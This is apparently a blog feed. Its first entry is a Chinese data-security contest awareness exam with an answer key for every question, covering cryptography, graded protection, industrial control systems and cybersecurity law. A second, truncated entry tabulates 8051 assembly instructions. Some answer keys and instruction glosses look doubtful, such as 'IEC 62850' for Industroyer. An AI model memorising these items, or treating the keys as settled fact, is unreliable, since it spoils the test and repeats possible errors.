        <content type="html"><![CDATA[<blockquote><p>“红明谷”杯数据安全大赛-安全意识赛</p><p>试卷说明：安全意识理论赛，一个半小时</p></blockquote><span id="more"></span><h5 id="一、单项选择题"><a href="#一、单项选择题" class="headerlink" title="一、单项选择题"></a>一、单项选择题</h5><p>1、以下不属于采用密码技术对数据本身进行保护的是（）。</p><p>​      A、防火墙技术</p><p>​      B、使用现代加密算法对数据进行加密以获得机密性</p><p>​      C、采用数字签名算法确保数据源的可靠性</p><p>​      D、采用杂凑算法和公钥算法保护数据完整性<br>标准答案：A</p><p>2、第二级信息系统抽查不包括哪项</p><p>​      A、存储被测系统重要数据的介质的存放环境</p><p>​      B、所有人员</p><p>​      C、重要管理终端</p><p>​      D、信息安全主管人员、各方面的负责人员；</p><p>标准答案：B</p><p>3、对于采用账户名/口令的网站，在已知用户名的情况下对用户口令进行爆破穷举。该口令包含8个字符，且所有的字符属于字母表的小写字符，该穷举（）个字符组合来获得口令？</p><p>​      A、21224576</p><p>​      B、208827064576</p><p>​      C、201520162818</p><p>​      D、20445276162016</p><p>标准答案：B</p><p>4、《网络安全法》是以第（）号主席令正式发布的。</p><p>​      A、五十三</p><p>​      B、五十四</p><p>​      C、五十五</p><p>​      D、五十六</p><p>标准答案：A</p><p>5、Diffie和Hellman观察到：世界上存在一些很容易完成，但反过来很难完成的行为，称这样的行为具有()</p><p>​      A、耦合性</p><p>​      B、单向性</p><p>​      C、拟合性</p><p>​      D、混沌性</p><p>标准答案：B</p><p>6、数据安全的主要技术手段是采用（）手段来对数据进行主动防护。</p><p>​      A、数据云存储手段</p><p>​      B、随意存储手段</p><p>​      C、即时接收存储手段</p><p>​      D、现代信息储存手段</p><p>标准答案：D</p><p>7、下列不属于资产中的信息载体的是（）。</p><p>​      A、软件<br>​      B、硬件<br>​      C、固件<br>​      D、机房<br>标准答案：D</p><p>8、近年来常有不法分子通过IP欺诈来进行网络诈骗，通常不法分子不会通过（）这样的攻击手段来完成IP欺骗的实施</p><p>​      A、Non-Blind Spoofing</p><p>​      B、Blind Spoofing</p><p>​      C、ACK Flooding</p><p>​      D、Man in the Middle at Tack</p><p>标准答案：C</p><p>9、对于违法行为的通报批评处罚，属于行政处罚中的是（）</p><p>​      A、人身自由罚</p><p>​      B、声誉罚</p><p>​      C、财产罚</p><p>​      D、资格罚</p><p>标准答案：B</p><p>10、世界上第一款军用级网络攻击武器是以下哪种木马病毒？</p><p>​      A、Triton病毒</p><p>​      B、火炎病毒（Flame)</p><p>​      C、震网病毒</p><p>​      D、沙蒙病毒（Shamoon)</p><p>标准答案：C</p><p>11、工业互联网的核心是（ ）</p><p>​      A、网络体系</p><p>​      B、应用体系</p><p>​      C、平台体系</p><p>​      D、用户体系</p><p>标准答案：C</p><p>12、()是信息系统等级确定的第三步</p><p>​      A、确定定级对象</p><p>​      B、信息系统等级评审</p><p>​      C、初步确定信息系统等级</p><p>​      D、信息系统等级的最终确定与审批</p><p>标准答案：B</p><p>13、关于安全单元测评结果汇总表符号描述错误的是</p><p>​      A、对勾表示</p><p>​      B、三角形表示待定</p><p>​      C、叉表示不符合</p><p>​      D、“N/A”表示“不适用”</p><p>标准答案：B</p><p>14、PC4R模型是一种工业互联网安全自适应防护模型，组成这个模型的步骤不包括（ )</p><p>​      A、信息感知</p><p>​      B、风险评定</p><p>​      C、数据汇集</p><p>​      D、网络融合</p><p>标准答案：B</p><p>15、对第五级信息系统，应当由___进行检查</p><p>​      A、公安部</p><p>​      B、知名学者委员会</p><p>​      C、有资质的安全企业</p><p>​      D、国家指定的专门部门</p><p>标准答案：D</p><p>16、工业互联网木马病毒肆虐，其中我们常见的Industroyer病毒支持的工业控制协议有（）</p><p>​      A、OPC DA Process Control Data Access</p><p>​      B、IEC60870-5-101</p><p>​      C、IEC60870-5-104</p><p>​      D、IEC 62850</p><p>标准答案：D</p><p>17、根据系统所采用的安全策略及所具备的安全功能，TCSEC将系统分为()类共()个安全等级</p><p>​      A、3 6</p><p>​      B、4 6</p><p>​      C、4 7</p><p>​      D、6 8</p><p>标准答案：C</p><p>18、现场评测一般从几个方面出发,分别是</p><p>​      A、四个方面：访谈、文档审查、配置检查、实地考察</p><p>​      B、五个方面：访谈、文档审查、配置检查、工具测试和实地察看</p><p>​      C、三个方面：文档审查、配置检查、实地考察</p><p>​      D、六个方面：访谈、文档审查、配置检查、工具测试、实地察看，人员测试</p><p>标准答案：B</p><p>19、在传统的信息系统安全领域中，我们将安全的三种基本属性简称为CIA，以下哪一个选项不属于安全的三种基本属性</p><p>​      A、实时性</p><p>​      B、完整性</p><p>​      C、保密性</p><p>​      D、可用性</p><p>标准答案：A</p><p>20、第四级信息系统抽查不包括哪项</p><p>​      A、介质的存放环境</p><p>​      B、全部应用系统</p><p>​      C、与本单位有关的企业</p><p>​      D、主要服务器</p><p>标准答案：C</p><p>21、可能给系统造成影响或者破坏的人包括（）</p><p>​      A、黑客和跨客</p><p>​      B、只有黑客</p><p>​      C、只有跨客</p><p>​      D、所有网络与信息系统使用者</p><p>标准答案：D</p><p>22、工业控制组件中，漏洞最多的是哪几种</p><p>​      A、工业交换机和通用软件</p><p>​      B、PLC和SCADA/HMI</p><p>​      C、OPC</p><p>​      D、工业网关</p><p>标准答案：B</p><p>23、()是网络社会中社会工程学直接用于攻击的表现之一。</p><p>​      A、SQL注入攻击的利用</p><p>​      B、利用同情、内疚和胁迫</p><p>​      C、口令破解中的社会工程学利用</p><p>​      D、网络攻击中的社会工程学利用</p><p>标准答案：B</p><p>24、与Stuxnet有一定的相似度， 都使用了相同的加密算法和密钥的病毒是？（）</p><p>​      A、震网病毒</p><p>​      B、毒区病毒</p><p>​      C、火炎病毒</p><p>​      D、Triton病毒</p><p>标准答案：B</p><p>25、工业控制系统中的人机交互界面设备由硬件和软件两部分组成。硬件包括处理器、显示单元、输入单元、通信接口等，其中是HMI核心的是（ ）</p><p>​      A、处理器</p><p>​      B、显示单元</p><p>​      C、输入单元</p><p>​      D、通信接口</p><p>标准答案：A</p><p>26、熊猫烧香病毒在哪一年爆发 ( )</p><p>​      A、2006</p><p>​      B、2007</p><p>​      C、2008</p><p>​      D、2009</p><p>标准答案：B</p><p>27、()是信息安全管理中，最需要进行管理的内容。</p><p>​      A、组织</p><p>​      B、人员</p><p>​      C、规则</p><p>​      D、目标</p><p>标准答案：D</p><p>28、工业互联网安全框架的防护措施视角不包括（）</p><p>​      A、异常清除</p><p>​      B、威胁防护</p><p>​      C、监测感知</p><p>​      D、处置恢复</p><p>标准答案：A</p><p>29、()是社会工程学在安全意识培训方面进行防御的措施之一。</p><p>​      A、构建完善的技术防御体系</p><p>​      B、定期在公司内部分享网络安全前沿技术</p><p>​      C、知道社会工程学攻击利用什么</p><p>​      D、有效的安全管理体系和操作</p><p>标准答案：C</p><p>30、安全信息系统中最重要的安全隐患是（）。</p><p>​      A、配置审查</p><p>​      B、临时账户管理</p><p>​      C、数据安全迁移</p><p>​      D、程序恢复</p><p>标准答案：A</p><p>31、由于服务器软件或者应用程序对用户输入文件名称的安全性验证不足，使得攻击者通HTTP请求和利用一些特殊字符就可以绕过服务器的访问限制，访问任意受限的其他文件，甚至执行系统命令的漏洞称为（ ）？</p><p>​      A、路径遍历漏洞</p><p>​      B、未授权访问漏洞</p><p>​      C、远程控制漏洞</p><p>​      D、远程代码执行漏洞</p><p>标准答案：A</p><p>32、下列哪一种是专门针对工业互联网的，以窃取信息为目标的木马病毒（）</p><p>​      A、Havex木马程序</p><p>​      B、毒区病毒（Duqu）</p><p>​      C、火焰病毒（Huoyan）</p><p>​      D、灰鸽子木马程序</p><p>标准答案：A</p><p>33、《网络安全法》第五十九条规定，网络运营者不履行网络安全保护义务的，最多处以（）罚款。</p><p>​      A、五万元</p><p>​      B、七万元</p><p>​      C、十万元</p><p>​      D、二十万元</p><p>标准答案：C</p><p>34、典型工业控制系统架构包括现场设备层、现场控制层、过程监控层等五个层次，其中可以实现对采集量进行调整和处理的是（ )</p><p>​      A、现场设备层</p><p>​      B、过程监控层</p><p>​      C、生产管理层</p><p>​      D、现场控制层</p><p>标准答案：D</p><p>35、关闭WIFI的自动连接功能可以防范( )</p><p>​      A、所有恶意攻击</p><p>​      B、假冒热点攻击</p><p>​      C、恶意代码</p><p>​      D、拒绝服务攻击</p><p>标准答案：B</p><p>36、下列关于分析与报告编制活动说法正确的是</p><p>​      A、应进行测评实施准备</p><p>​      B、应对测评工具接入点确定</p><p>​      C、必须对测评指导书开发</p><p>​      D、首先应进行单项测评结果判定</p><p>标准答案：D</p><p>37、1949年()发表了《保密系统的通信理论》，奠定了现代密码学的基础。</p><p>​      A、Shannon</p><p>​      B、Ron Rivest</p><p>​      C、Adi Shanir</p><p>​      D、Leonard Adledleman</p><p>标准答案：A</p><p>38、下列任务与输出文档一一对应的是</p><p>​      A、测评对象确定:被测系统定级结果、测评指标</p><p>​      B、测评内容确定:被测系统的整体结构、边界、网络区域、重要节点、测评对象等</p><p>​      C、测评方案编制：各测评对象的测评内容及方法</p><p>​      D、测评指标确定：被测系统定级结果、测评指标</p><p>标准答案：D</p><p>39、由SANS公司的研究员在2015年8月发表的一份白皮书《网络安全滑动标尺模型》中建立的网络安全滑动标尺模型包含五大类别，分别为基础架构、被动防御、积极防御、威胁情报和反制攻击，其中具有消耗攻击资源，缩小攻击面特点的是（ ）</p><p>​      A、被动防御</p><p>​      B、积极防御</p><p>​      C、威胁情报</p><p>​      D、反制攻击</p><p>标准答案：A</p><p>40、互联网出口必须向公司信息化主管部门进行（）后方可使用</p><p>​      A、备案审批</p><p>​      B、申请</p><p>​      C、说明</p><p>​      D、报备</p><p>标准答案：A</p><p>41、以下哪项不属于防止口令猜测的措施（）</p><p>​      A、严格限定从一个给定的终端进行非法认证的次数</p><p>​      B、确保口令不在终端再现</p><p>​      C、防止用户使用太短的口令</p><p>​      D、使用机器产生的口令</p><p>标准答案：B</p><p>42、已运营（运行）的第二级以上信息系统，应当在安全保护等级确定后几日内到公安部办理手续</p><p>​      A、20日</p><p>​      B、30日</p><p>​      C、60日</p><p>​      D、45日</p><p>标准答案：B</p><p>43、工业互联网系统对社会经济、环境、人员安全的巨大影响，对于一般信息系统更加强调它的RAMS属性，（）不属于RAMS属性</p><p>​      A、可靠性</p><p>​      B、可维护性</p><p>​      C、可持续性</p><p>​      D、安全性</p><p>标准答案：C</p><p>44、工业控制系统漏洞被不法分子所利用往往会给企业带来各种损失，其中路径遍历漏洞就 属于高危漏洞其主要的特征有（）</p><p>​      A、由于需要安全配置或权限认证的地址、授权页面等存在一定的缺陷、导致其他用户可以直接访问，从而引发重要权限可被操作，数据库，网站目录等敏感信息泄露</p><p>​      B、由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p><p>​      C、由于程序员在开发用户和数据库交换的系统时没有对用户输入的字符串进行过滤、转义、限制和处理不严谨，导致用户可以通过输入精心构造的字符去非法获取数据库中的信息</p><p>​      D、由于服务器软件或者应用程序对用户输入文件名称的安全性验证不足</p><p>标准答案：D</p><p>45、目前已公开的案例中勒索病毒对工业系统的威胁还停留在（ ）勒索阶段。</p><p>​      A、物理攻击</p><p>​      B、加密文件</p><p>​      C、窃取机密</p><p>​      D、锁定设备</p><p>标准答案：B</p><p>46、（）是《工业互联网安全框架》所提出的网络安全</p><p>​      A、标识解析系统安全</p><p>​      B、工厂外部数据安全</p><p>​      C、工厂外部网络安全</p><p>​      D、工厂内部网络安全</p><p>标准答案：B</p><h5 id="二、多项选择题"><a href="#二、多项选择题" class="headerlink" title="二、多项选择题"></a>二、多项选择题</h5><p>1、以下哪些属于PE文件保护技术？</p><p>​      A、PE完整性检测</p><p>​      B、注册表监控</p><p>​      C、PE文件访问权限保护</p><p>​      D、加壳保护</p><p>标准答案：ABCD<br>2、为保护工业大数据安全搭建的统一数据安全管理系统，创造了面向数据的安全管理体系框架。平台架构的最底层和最高层分别为（ ）（注意选项顺序）</p><p>​      A、敏感数据隔离交互层</p><p>​      B、数据脱敏层</p><p>​      C、数据分析层</p><p>​      D、数据加固层</p><p>标准答案：CD</p><p>3、在等级测评过程中可以规避风险的措施是：</p><p>​      A、签署委托测评协议</p><p>​      B、口头上达成保密协议</p><p>​      C、现场测评工作风险的规避</p><p>​      D、测评现场还原</p><p>标准答案：ACD</p><p>4、等级测评有几个测评过程,有：</p><p>​      A、测评准备活动</p><p>​      B、方案编制活动</p><p>​      C、现场测评活动</p><p>​      D、报告编制活动</p><p>标准答案：ABCD</p><p>5、保护企业网络的有效措施是？</p><p>​      A、为设备提供安全认证证书</p><p>​      B、部署SSL证书</p><p>​      C、为软件进行代码签名证书</p><p>​      D、为员工通讯邮箱部署电子邮件证书</p><p>标准答案：BCD</p><p>6、企业内部的信息管理安全风险有：</p><p>​      A、文件打印、传真风险</p><p>​      B、上网行为风险</p><p>​      C、病毒和木马风险</p><p>​      D、用户密码风险</p><p>标准答案：ABD</p><p>7、火灾自动报警、自动灭火系统部署应注意（）。</p><p>​      A、避开可能招致电磁干扰的区域或设备</p><p>​      B、具有不间断的专用消防电源</p><p>​      C、留备用电源</p><p>​      D、具有自动和手动两种触发装置</p><p>标准答案：ABCD</p><p>8、按照秘密、机密、绝密三级的不同要求，结合系统实际进行方案设计，实施分级保护，其保护水平总体上不低于国家信息安全等级保护</p><p>​      A、第二级、第四级、第五级</p><p>​      B、第三级</p><p>​      C、第三级、第四级、第五级</p><p>​      D、第四级</p><p>标准答案：C</p><p>9、数字水印有哪些特征（）？</p><p>​      A、不需要带外传输</p><p>​      B、透明性</p><p>​      C、鲁棒性</p><p>​      D、单一性</p><p>标准答案：ABC</p><p>10、用户的个人行为该怎样保证操作系统的安全？</p><p>​      A、定期进行系统更新</p><p>​      B、定期优化系统，清理注册表、垃圾文件等</p><p>​      C、禁用和关闭不常用的服务和端口</p><p>​      D、定期安装最新的系统更新程序和漏洞补丁</p><p>标准答案：ABCD</p><p>11、非对称密码一般要求(),()</p><p>​      A、加密解密使用相同密钥</p><p>​      B、加密解密使用不同密钥</p><p>​      C、发送方拥有加密或解密密钥，接收方拥有另一个密钥</p><p>​      D、收发双方必须共享密钥</p><p>标准答案：BC</p><p>12、密码系统包括(),(),()和密码算法</p><p>​      A、通信机制</p><p>​      B、密钥空间</p><p>​      C、明文空间</p><p>​      D、密文空间</p><p>标准答案：BCD</p><p>13、我们可以采取以下哪些措施用于防范口令攻击？</p><p>​      A、设置的口令尽可能复杂，使用数字、字母、特殊符号组成</p><p>​      B、选择一个具有很强安全性的复杂口令，在所有系统都使用它作为认证手段</p><p>​      C、定期更改口令</p><p>​      D、输入口令时确保周围没有其他人偷窥</p><p>标准答案：ACD</p><p>14、工业控制系统因受其生产环境所限，补丁漏洞的存在就算是已知也未必能够修复，其中（）导致了工业控制系统中策略和程序脆弱性</p><p>​      A、缺乏针对工业控制网络的特定安全策略</p><p>​      B、操作系统及应用的软件补丁未经过测试</p><p>​      C、缺乏安全架构和设计</p><p>​      D、缺乏安全审计</p><p>标准答案：ACD</p><p>15、信息系统的安全技术体系架构包括(),(),()应用和数据等几个方面</p><p>​      A、物理</p><p>​      B、人员</p><p>​      C、网络</p><p>​      D、系统</p><p>标准答案：ACD</p><p>16、现场测评活动的主要任务包括：</p><p>​      A、现场测评</p><p>​      B、现场测评准备</p><p>​      C、结果记录</p><p>​      D、结果确认和资料归还</p><p>标准答案：ABCD</p><p>17、以下哪些选项属于权限管理四项基本原则？</p><p>​      A、纵深</p><p>​      B、累加</p><p>​      C、拒绝优于允许</p><p>​      D、继承性</p><p>标准答案：BCD</p><p>18、为什么信息系统杀毒软件不适用于工业生产环境</p><p>​      A、信息系统杀毒软件需要定期更新病毒库等，无法适应工业连续生产的要求</p><p>​      B、信息系统杀毒软件对CPU和内存占用较高，无法适应工业生产环境的“可用性”要求</p><p>​      C、信息系统杀毒软件和工业软件存在兼容性问题</p><p>​      D、信息系统杀毒软件所带来的费用高昂</p><p>标准答案：ABC</p><p>19、测评活动的主要内容有</p><p>​      A、工具和表单准备</p><p>​      B、信息收集和分析</p><p>​      C、测评准备活动输出文档</p><p>​      D、项目启动</p><p>标准答案：ABCD</p><p>20、个人信息中的网络身份标识信息包括</p><p>​      A、硬件序列号</p><p>​      B、IP地址</p><p>​      C、用户个人数字证书</p><p>​      D、系统编号</p><p>标准答案：BCD</p><p>21、保障企业信息在存储传输过程中的(),(),()和不可抵赖性，是网络安全的目标之一。</p><p>​      A、全面性</p><p>​      B、完整性</p><p>​      C、合法性</p><p>​      D、保密性</p><p>标准答案：BCD</p><p>22、工业控制系统因其特殊性以及对其稳定性的要求不能够经常更新系统，所以导致了工业控制系统漏洞百出，其中常见的漏洞类型有（）</p><p>​      A、拒绝服务漏洞</p><p>​      B、访问控制漏洞</p><p>​      C、信息泄露漏洞</p><p>​      D、路径遍历漏洞</p><p>标准答案：ABCD</p><p>23、《网络安全法》的意义包括（）。</p><p>​      A、落实党中央决策部署的重要举措</p><p>​      B、维护网络安全的客观需要</p><p>​      C、维护民众切身利益的必然要求</p><p>​      D、参与互联网国际竞争和国际治理的必然选择</p><p>标准答案：ABCD</p><p>24、《信息系统等级保护安全设计技术要求》要求(),(),()和安全管理中心</p><p>​      A、安全计算环境</p><p>​      B、安全区域边界</p><p>​      C、安全通信网络</p><p>​      D、安全运营中心</p><p>标准答案：ABC</p><p>25、测评指标在技术/管理层面包括：</p><p>​      A、安全技术</p><p>​      B、人员安全意识</p><p>​      C、安全漏洞</p><p>​      D、安全管理</p><p>标准答案：AD</p><p>26、以下哪些是密码误用的例子</p><p>​      A、VPN配置策略不当</p><p>​      B、SSL使用无效证书，客户端存在证书校验问题</p><p>​      C、Android应用依赖第三方函数库导致各种密码学误用问题</p><p>​      D、在大部分嵌入式设备中，唯一的熵源只能是中断事件，熵源不足，影响随机数产生的安全性</p><p>标准答案：ABCD</p><p>27、网络运营者包括（）。</p><p>​      A、网络所有者</p><p>​      B、网络管理者</p><p>​      C、网络使用者</p><p>​      D、网络服务提供者</p><p>标准答案：ABD</p><p>28、零信任安全架构的理念可简单概括为（ )</p><p>​      A、要始终假设网络充满威胁，外部和内部威胁每时每刻都充斥着网络</p><p>​      B、不能仅仅依靠网络位置来建立信任关系</p><p>​      C、所有用户、设备和网络流量都应该被认证和授权</p><p>​      D、访问控制策略应该动态地、基于尽量多的数据源进行计算和评估</p><p>标准答案：ABCD</p><p>29、入侵检测系统的功能包含以下哪些选项？</p><p>​      A、过滤非法数据包</p><p>​      B、监视通信数据流</p><p>​      C、捕获可疑的网络行为</p><p>​      D、生成安全审计报告</p><p>标准答案：BCD</p><p>30、态势感知层产品处于产品结构的顶层，其核心能力是（ ）</p><p>​      A、集中管控</p><p>​      B、情报搜集</p><p>​      C、数据高级分析</p><p>​      D、数据采集</p><p>标准答案：BC</p><h5 id="三、判断题"><a href="#三、判断题" class="headerlink" title="三、判断题"></a>三、判断题</h5><p>1、个人信息保存中个人信息控制者传输和存储敏感信息时，应采用加密等安全措施。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>2、计算机场地在正常情况下温度保持在18 - 28摄氏度。（）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>3、DNS属于应用层协议，既可以使用TCP协议，又可以使用UDP协议。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>4、数字签名过程中，先对消息加密，再对加密消息计算散列值并附加在消息之后。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>5、数据安全的保密性就是指，数据仅能被应该知悉的用户或实体读取和理解，其他实体不能读取数据或理解数据的含义（）。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>6、网络安全滑动标尺模型需要按照从左到右的顺序建设，其中被动防御和积极防御均需要人员的介入。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>7、基于主机的数据备份，该备份方式是将存储设备直接接在云主机上，而且还为其他服务器提供数据备份服务。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>8、在多层密钥体系中，一旦下层密钥泄露，上层密钥的安全性会荡然无存。（）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>9、基于威胁情报的工业威胁检测技术，对于受害目标及攻击源头的精准定位并不能产生较理想的效果。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>10、安全风险评估是信息安全等级保护建设的重要科学方法之一，可以运用到等级保护周期的系统定级、安全实施和安全运维等阶段。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>11、基于用户数据安全的保护，如果是重要的数据，可进行异地存储。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>12、由于工业控制系统中传输的数据通常是指令和采集的原始数据，而且多为实时数据，因此相对于完整性和可用性而言，对保密性要求最高。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>13、工业安全检查评估工具多为便携式设备，带有高清显示屏幕，且只需接入镜像流量即可，无须复杂配置。使用在线旁路部署方式，采用主动模式检查。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>14、《网络安全法》为整套的法规、规章预留了接口。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>15、容灾，就是减少灾难事件发生的可能性以及限制灾难对关键业务流程所造成的影响的一整套行为（）。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>16、关于测评准备活动中信息收集与分析任务的输出文档为填好的调查表格和各种与被测信息系统相关的资料。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>17、通过做好必要的分隔管控工作可以减少工业控制系统在接入互联网后被攻击的风险。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>18、工业互联网是连接I业全系统、全产业链、全价值链，支撑工业智能化发展的关键基础设施，是互联网从消费领域向生产领域、从虚拟经济向实体经济拓展的核心载体。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>19、造成工业控制系统暴露的主要原因之一是“商业网络”和“工业网络”的不断融合。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>20、在笔记本电脑感染勒索病毒后进行物理隔离断网操作，拔掉网线、禁用网卡即可。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>21、针对工业控制系统的攻击，攻击者的主要目的是获取商业情报、流程工艺，进行远程控制或者恶意破坏。（ ）</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：A</p><p>22、第三方公司人员到公司洽谈业务，期间向您要公司无线网络的账号密码，您直接给他一个公用的账号密码。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>23、等级保护基本要求中的三级主机安全要求：增加对登录失败、安全传输、口令复杂度等要求，增加特权分离要求，增加审计记录保护要求，增加补丁及时更新要求，增加软件统一管理要求，增加单个业务应用使用系统资源的限制要求。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><p>24、高中低位能力安全产品体系中，安全运营层的核心能力是情报搜集和数据高级分析。</p><p>​      A、正确</p><p>​      B、错误</p><p>标准答案：B</p><hr><p>附上技能赛签到的一些题</p><p>在数据库系统中， <strong>口令保护</strong> 是信息系统的第一道屏障。</p><p>为了防止物理上取走数据库而采取的加强数据库安全的方法是 <strong>数据库加密</strong> 。</p><p>发生 <strong>介质故障</strong> 后，磁盘上的物理数据和日志文件被破坏，这是最严重的一种故障，恢复方法是重装数据库，然后重做已完成的事务。</p><p>在数据库的安全评估过程中，下面那项是指系统能够对付各种可能的攻击的能力。    <strong>可行性</strong></p><p>数据库访问控制策略中， <strong>只需策略</strong> 是只让用户得到有相应权限的信息，这些信息恰到可以让用户完成自己的工作，其他的权利一律不给。</p><p>数据库的 <strong>安全策略</strong> 是指如何组织、管理、保护和处理敏感信息的指导思想。它包括安全管理策略、访问控制策略和信息控制策略。</p><p>数据库的加密方法中，采用 <strong>库外加密</strong> ，则密钥管理较为简单，只需借用文件加密的密钥管理方法。</p><p>在下面的加密方法中，哪个加解密的效率最低： <strong>元素加密</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 理论题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令</title>
      <link href="/article/2021-09-28-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
      <url>/article/2021-09-28-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>主要介绍汇编指令常用命令。</p><span id="more"></span><h5 id="一、数据传送指令"><a href="#一、数据传送指令" class="headerlink" title="一、数据传送指令"></a>一、数据传送指令</h5><table><thead><tr><th>数据传送指令</th><th></th></tr></thead><tbody><tr><td>MOV</td><td>(Move)对内部数据寄存器RAM和特殊功能寄存器SFR的数据进行传送</td></tr><tr><td>MOVX</td><td>(Move External RAM）对外部存储器的数据传送</td></tr><tr><td>XCH</td><td>(Exchange)字节交换</td></tr><tr><td>XCHD</td><td>(Exchange Low-order Digit)低半字节交换</td></tr><tr><td>PUSH</td><td>(Push onto Stack)入栈</td></tr><tr><td>POP</td><td>(Pop from Stack)出栈</td></tr></tbody></table><h5 id="二、算术运算指令"><a href="#二、算术运算指令" class="headerlink" title="二、算术运算指令"></a>二、算术运算指令</h5><table><thead><tr><th>算术运算指令</th><th></th></tr></thead><tbody><tr><td>ADD</td><td>(Addition)加法</td></tr><tr><td>ADDC</td><td>(Add with Carry)带进位加法</td></tr><tr><td>SUBB</td><td>(Subtract with Borrow)带借位减法</td></tr><tr><td>DA</td><td>(Decimal Adjust)十进制调整</td></tr><tr><td>INC</td><td>(Increment)加1</td></tr><tr><td>DEC</td><td>(Decrement)减1</td></tr><tr><td>MUL</td><td>(Multiplication Multiply)乘法</td></tr><tr><td>DIV</td><td>(Division Divide)除法</td></tr></tbody></table><h5 id="三、逻辑运算类指令"><a href="#三、逻辑运算类指令" class="headerlink" title="三、逻辑运算类指令"></a>三、逻辑运算类指令</h5><table><thead><tr><th>逻辑运算类指令</th><th></th></tr></thead><tbody><tr><td>ANL</td><td>(AND Logic)逻辑与</td></tr><tr><td>ORL</td><td>(OR Logic)逻辑或</td></tr><tr><td>XRL</td><td>(Exclusive-OR Logic)逻辑异或</td></tr><tr><td>CLR</td><td>(Clear)清零</td></tr><tr><td>CPL</td><td>(Complement)取反</td></tr><tr><td>RL</td><td>(Rotate left)循环左移</td></tr><tr><td>RLC</td><td>(RL throught the carry flag)带进位循环左移</td></tr><tr><td>SWAP</td><td>(Swap)低4位与高4位交换</td></tr></tbody></table><h5 id="四、控制转移类指令"><a href="#四、控制转移类指令" class="headerlink" title="四、控制转移类指令"></a>四、控制转移类指令</h5><table><thead><tr><th>控制转移类指令</th><th></th></tr></thead><tbody><tr><td>ACCALL</td><td>(Absolute subroutine  Call)子程序绝对调用</td></tr><tr><td>LCALL</td><td>(Long subrout Call)子程序常调用</td></tr><tr><td>RET</td><td>(Return from Interruption)子程序返回</td></tr><tr><td>RET1</td><td>(Return from Interruption)中断返回</td></tr><tr><td>SJMP</td><td>(Short jump)短转移</td></tr><tr><td>AJMP</td><td>(Absolute jump)绝对转移</td></tr><tr><td>LJMP</td><td>(Long Jump)长转移</td></tr><tr><td>CJNE</td><td>(Compare Jump if Not Equal)比较不等则转</td></tr><tr><td>DJNZ</td><td>(Decrement Jump if Not Zero)减1不为0则转</td></tr><tr><td>JZ</td><td>(Jump if zero)结果为0则跳转</td></tr><tr><td>JNZ</td><td>(Jump if Not Zero)结果不为0则跳转</td></tr><tr><td>JC</td><td>(Jump if Not carry flag is set)有进位则转移</td></tr><tr><td>JB</td><td>(Jump if the Bit is set)位为1则转移</td></tr><tr><td>JNB</td><td>(Jump if the Bit is Not set)位为0则转移</td></tr><tr><td>JBC</td><td>(JB and Clear the bit)位为1则转并清除该位</td></tr><tr><td>NOP</td><td>(No Operation)空操作</td></tr></tbody></table><h5 id="五、位操作指令"><a href="#五、位操作指令" class="headerlink" title="五、位操作指令"></a>五、位操作指令</h5><table><thead><tr><th>位操作指令</th><th></th></tr></thead><tbody><tr><td>CLR</td><td>位清零</td></tr><tr><td>SETB</td><td>(Set Bit)位置1</td></tr></tbody></table><h5 id="六、常用伪指令"><a href="#六、常用伪指令" class="headerlink" title="六、常用伪指令"></a>六、常用伪指令</h5><table><thead><tr><th>常用伪指令</th><th></th></tr></thead><tbody><tr><td>1.ORG   16位地址此指令用在原程序或数据块的开始，指明此语句后面目标程序或数据块存放的起始地址</td><td></td></tr><tr><td>2.【标号】DB  字节数据项表:奖项表中的字节数据存放到从标号开始的连续字节单元中。</td><td>例如SEG:DB 88H, 100,”7” ,”C”</td></tr><tr><td>3.【标号】DW  双字节数据项表:定义16位地址表，16地址按低位地址存低位字节，高位地址存高位字节。</td><td>例如TAB:DW 1234H, 7BH</td></tr><tr><td>4.名字 EQU 表达式  或名字=表达式:用于给一个表达式赋值或给字符串起名字。之后名字可用作程序地址,数据地址或立即数地址使用。名字必须是一字母开头的字母数据串。</td><td>例如:COUNT=10或SPACE EQU 10H</td></tr><tr><td>5.名字 DATA  直接字节地址:给8位外部RAM单元起个名字，名字必须是一字母开头的字母数据串。同一单元可起多个名字。</td><td>例如:ERROR DATA 80H</td></tr><tr><td>6.XDATA直接字节地址:给8位外部RAM起个名字，名字规定同DATA伪指令。、</td><td>例如:IO_POTR XDATA OCF04H</td></tr><tr><td>7.名字 Bit  指令:给一位可寻址的位单元起个名字，规定同DATA伪指令。</td><td>例如SWT BIT 